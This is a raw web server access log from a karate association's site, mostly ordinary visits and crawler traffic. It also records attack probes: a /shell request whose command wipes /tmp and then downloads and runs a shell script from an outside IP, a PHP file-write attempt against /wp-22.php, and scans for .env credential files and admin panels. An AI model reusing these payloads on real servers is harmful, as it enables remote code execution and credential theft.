::ffff:194.225.24.214 - - [03/Oct/2022:00:02:50 +0000] "GET /wp-22.php?sfilename=on.php&sfilecontent=<%3F%3D409723%2A20%3B&supfiles=on.php HTTP/1.1" 404 148 "-" "Mozilla/5.0 (Linux; Android 11; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 OPR/63.3.3216.58675"
::ffff:37.139.53.82 - - [03/Oct/2022:15:01:01 +0000] "GET /?err=error HTTP/1.0" 200 58692 "http://wadokikai.net/?err=error#signup" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
::ffff:157.55.39.207 - - [03/Oct/2022:15:02:47 +0000] "GET /images/schools/earhartkaratedo.jpg HTTP/1.1" 200 35835 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:06:48 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:06:51 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:43.132.196.160 - - [03/Oct/2022:15:10:05 +0000] "GET / HTTP/1.1" 200 58140 "-" "'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'"
::ffff:114.119.130.218 - - [03/Oct/2022:15:13:32 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:114.119.128.244 - - [03/Oct/2022:15:13:58 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
::ffff:169.199.80.102 - - [03/Oct/2022:15:23:41 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 200 32690 "https://www.google.com/" "Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:169.199.80.102 - - [03/Oct/2022:15:23:51 +0000] "GET /images/instructors/anunley.jpg HTTP/1.1" 304 - "https://www.google.com/" "Mozilla/5.0 (X11; CrOS x86_64 14816.131.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
::ffff:40.77.167.70 - - [03/Oct/2022:15:25:10 +0000] "GET /images/books/MBS2.jpg HTTP/1.1" 200 15317 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:73.231.249.115 - - [03/Oct/2022:15:29:24 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:73.231.249.115 - - [03/Oct/2022:15:35:55 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:49:37 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:99.92.92.199 - - [03/Oct/2022:15:50:37 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://wadokikai.org/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:46.19.141.122 - - [03/Oct/2022:15:50:54 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:46.19.141.122 - - [03/Oct/2022:15:50:58 +0000] "POST /HNAP1/ HTTP/1.1" 404 146 "-" "Mozila/5.0"
::ffff:1.14.170.35 - - [03/Oct/2022:15:53:04 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+79.110.62.227/lol.sh;sh+/tmp/lol.sh HTTP/1.1" - - "-" "Hello, world"
::ffff:45.79.171.66 - - [03/Oct/2022:16:01:43 +0000] "GET /service.php?token=1819&action=11 HTTP/1.0" 404 150 "-" "-"
::ffff:66.249.75.216 - - [03/Oct/2022:16:09:55 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.214 - - [03/Oct/2022:16:09:55 +0000] "GET /docs/Self-DefenseAwarenessInfo.pdf HTTP/1.1" 404 173 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:192.241.214.101 - - [03/Oct/2022:16:13:48 +0000] "GET /manager/text/list HTTP/1.1" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.75.216 - - [03/Oct/2022:16:19:36 +0000] "GET /prelims/MSACFall2018Promotional.pdf HTTP/1.1" 404 174 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:157.55.39.207 - - [03/Oct/2022:16:21:24 +0000] "GET /images/instructors/SenseiLarry.jpg HTTP/1.1" 200 60380 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:128.199.107.27 - - [03/Oct/2022:16:26:33 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:45 +0000] "GET / HTTP/1.1" 200 58140 "-" "-"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:46 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:47 +0000] "PRI * HTTP/2.0" - - "-" "-"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:47 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.58 - - [03/Oct/2022:16:34:48 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.249.75.212 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.194 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.204 - - [03/Oct/2022:16:47:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.221 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.223 - - [03/Oct/2022:16:47:22 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.75.204 - - [03/Oct/2022:16:47:23 +0000] "GET /ads.txt HTTP/1.1" 404 146 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:40.88.21.235 - - [03/Oct/2022:16:56:05 +0000] "GET / HTTP/1.1" 200 58140 "http://wadokikai.org/" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:40.88.21.235 - - [03/Oct/2022:16:56:06 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://wadokikai.org/images/favicon.ico" "Mozilla/5.0 (compatible; DuckDuckGo-Favicons-Bot/1.0; +http://duckduckgo.com)"
::ffff:66.249.75.216 - - [03/Oct/2022:16:58:06 +0000] "GET /docs/TwentyGuidingPriciplesOfKarate.pdf HTTP/1.1" 404 178 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
::ffff:66.240.236.116 - - [03/Oct/2022:16:58:27 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.137 - - [03/Oct/2022:17:01:25 +0000] "GET /images/schools/marinkaratedo.jpeg HTTP/1.1" 200 104735 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:52.141.30.202 - - [03/Oct/2022:17:04:59 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:00 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:01 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:52.141.30.202 - - [03/Oct/2022:17:05:02 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 200 4337 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/wkkpatch22_med.png HTTP/1.1" 200 32301 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/alamedakaratedomap.jpg HTTP/1.1" 200 38311 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /css/wadokikai.css HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/orindakaratedomap.jpg HTTP/1.1" 200 34167 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/dcakaratedomap.jpg HTTP/1.1" 200 35262 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/promotions/AFSPrelimSchedule.pdf HTTP/1.1" 200 57396 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 200 36421 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 200 42667 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET / HTTP/1.1" 200 58140 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/harborbaykaratedomap.jpg HTTP/1.1" 200 37245 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/marinkaratedomap.jpg HTTP/1.1" 200 32400 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/earhartkaratedomap.jpg HTTP/1.1" 200 41366 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/corpuzkaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 200 55402 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/martinezkaratedomap.jpg HTTP/1.1" 200 37724 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/nunleykaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/schools/manzanitakaratedomap.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /js/common.js HTTP/1.1" 200 2255 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/dragon-trans.png HTTP/1.1" 200 85661 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:10 +0000] "GET /images/favicon.ico HTTP/1.1" 200 3638 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:14 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:17 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 200 35066 "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:14:21 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:192.241.221.77 - - [03/Oct/2022:17:14:35 +0000] "GET /manager/html HTTP/1.1" 404 151 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:73.231.249.115 - - [03/Oct/2022:17:14:48 +0000] "GET /images/tiger.bmp HTTP/1.1" 200 311274 "http://www.wadokikai.net/resources" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:157.55.39.207 - - [03/Oct/2022:17:16:30 +0000] "GET /joinemail?type=promotions HTTP/1.1" 200 8841 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:135.125.246.189 - - [03/Oct/2022:17:19:32 +0000] "POST / HTTP/1.1" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:135.125.246.189 - - [03/Oct/2022:17:19:33 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:19:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:19:43 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:216.244.66.196 - - [03/Oct/2022:17:20:19 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:216.244.66.196 - - [03/Oct/2022:17:22:32 +0000] "GET /instructors.html HTTP/1.1" 404 155 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
::ffff:4.53.139.193 - - [03/Oct/2022:17:24:35 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:24:39 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:30:52 +0000] "GET /images/tiger.bmp HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:30:56 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:185.191.171.2 - - [03/Oct/2022:17:31:22 +0000] "GET /robots.txt HTTP/1.1" 404 149 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:185.191.171.39 - - [03/Oct/2022:17:31:23 +0000] "GET /joinemail HTTP/1.1" 200 8629 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:40.77.167.70 - - [03/Oct/2022:17:34:22 +0000] "GET /images/shuri-lineage.jpg HTTP/1.1" 200 120427 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:4.53.139.193 - - [03/Oct/2022:17:38:25 +0000] "GET /images/wadokikai%20kanji.jpg HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:4.53.139.193 - - [03/Oct/2022:17:38:29 +0000] "GET /images/dragon-trans.png HTTP/1.1" 304 - "http://www.wadokikai.net/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:25 +0000] "GET /ab2g HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:26 +0000] "GET /ab2h HTTP/1.1" 404 143 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:206.189.132.238 - - [03/Oct/2022:17:39:32 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:157.55.39.61 - - [03/Oct/2022:17:50:08 +0000] "GET /images/instructors/amastroianni.jpg HTTP/1.1" 200 78389 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
::ffff:185.191.171.16 - - [03/Oct/2022:17:54:16 +0000] "GET /joinemail HTTP/1.1" 200 8629 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:52 +0000] "GET / HTTP/1.1" 200 58140 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:52 +0000] "GET /contact?s=1&ss=5 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:53 +0000] "GET /contact?s=1&ss=4 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:53 +0000] "GET /contact?s=1&ss=3 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:54 +0000] "GET /contact?s=1&ss=6 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:54 +0000] "GET /contact?s=1&ss=9 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:55 +0000] "GET /contact?s=1&ss=8 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:56 +0000] "GET /contact?s=1&ss=7 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:56 +0000] "GET /contact?s=1&ss=1 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:57 +0000] "GET /contact?s=1&ss=0 HTTP/1.1" 200 9997 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:56:57 +0000] "GET /contact HTTP/1.1" 200 10017 "http://www.wadokikai.net/" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:57:00 +0000] "POST /sendemail HTTP/1.1" 302 96 "http://www.wadokikai.net/contact?s=1&ss=7" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:154.21.97.170 - - [03/Oct/2022:17:57:00 +0000] "GET /contact/?msg=sent&s=1 HTTP/1.1" 200 10400 "http://www.wadokikai.net/sendemail" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
::ffff:95.214.235.205 - - [03/Oct/2022:18:13:48 +0000] "GET /.env HTTP/1.1" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
